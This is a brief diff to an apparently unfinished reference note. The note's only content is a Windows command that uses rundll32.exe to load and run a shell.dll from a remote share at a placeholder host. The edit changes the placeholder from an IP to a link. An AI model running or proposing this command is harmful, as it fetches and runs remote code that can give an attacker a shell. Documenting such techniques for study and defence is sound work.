@@ -3,7 +3,7 @@
 TODO: Fill in this info
 
 ```
-C:\> rundll32.exe \\<4shared_IP>\shell.dll,Main
+C:\> rundll32.exe \\<4shared_link>\shell.dll,Main
 ```
 
 ---
